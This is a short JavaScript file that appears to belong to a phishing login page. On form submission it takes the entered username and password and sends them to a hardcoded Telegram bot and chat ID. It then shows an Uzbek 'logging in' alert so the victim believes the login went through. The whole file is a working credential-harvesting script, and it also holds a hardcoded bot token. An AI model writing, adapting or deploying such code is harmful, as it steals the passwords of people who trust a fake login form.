const BOT_TOKEN = "8518433899:AAEevfdYoZVCGe26iIkiL7VHSdlIWj89-w8";
const ADMIN_CHAT_ID = "8114476248";
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;

document.getElementById("contactForm").addEventListener("submit", function(e) {
	e.preventDefault();

let name = document.getElementById("name").value;
let pess = document.getElementById("pess").value;

let adminText = `📩 New user has arrived:\n👤 username: ${name}\n🔑 Password: ${pess}`;

fetch(TELEGRAM_API, {
method: "POST",
headers: { "Content-Type": "application/json" },
body: JSON.stringify({
chat_id: ADMIN_CHAT_ID,
 text: adminText,
parse_mode: "HTML"
	})
})
.then(res => res.json())
.then(data => {
alert("Tizimga kirilmoqda!!!");
document.getElementById("contactForm").reset();
})
.catch(err => {
 alert("Xatolik yuz berdi ❌ - Iltimos qaytadan uruning");
console.error(err);
	});
});